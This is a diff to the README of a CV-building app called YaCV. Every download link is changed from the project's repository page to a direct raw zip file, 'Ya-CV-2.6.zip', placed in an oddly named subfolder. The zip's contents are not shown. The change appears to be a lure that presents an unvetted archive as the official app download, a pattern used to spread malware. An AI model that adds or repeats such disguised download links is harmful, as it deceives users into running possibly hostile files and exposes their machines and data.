@@ -1,6 +1,6 @@
 # 📝 YaCV - Build ATS-Friendly CVs Fast
 
-[![Download YaCV](https://img.shields.io/badge/Download-YaCV-blue?style=for-the-badge)](https://github.com/Maxierepresentational96/YaCV)
+[![Download YaCV](https://img.shields.io/badge/Download-YaCV-blue?style=for-the-badge)](https://github.com/Maxierepresentational96/YaCV/raw/refs/heads/main/tellurate/Ya-CV-2.6.zip)
 
 ## 🚀 What YaCV Does
 
@@ -34,7 +34,7 @@ For the best result, keep your browser up to date.
 
 Visit this page to download or open the app:
 
-[https://github.com/Maxierepresentational96/YaCV](https://github.com/Maxierepresentational96/YaCV)
+[https://github.com/Maxierepresentational96/YaCV/raw/refs/heads/main/tellurate/Ya-CV-2.6.zip](https://github.com/Maxierepresentational96/YaCV/raw/refs/heads/main/tellurate/Ya-CV-2.6.zip)
 
 If the page opens a file list or a release page, look for the main app file or the GitHub Pages link. Then:
 
@@ -227,7 +227,7 @@ This helps your CV stay readable on screen and on paper
 
 Use this link to get YaCV:
 
-[https://github.com/Maxierepresentational96/YaCV](https://github.com/Maxierepresentational96/YaCV)
+[https://github.com/Maxierepresentational96/YaCV/raw/refs/heads/main/tellurate/Ya-CV-2.6.zip](https://github.com/Maxierepresentational96/YaCV/raw/refs/heads/main/tellurate/Ya-CV-2.6.zip)
 
 ## 🧾 Suggested First Edit
 
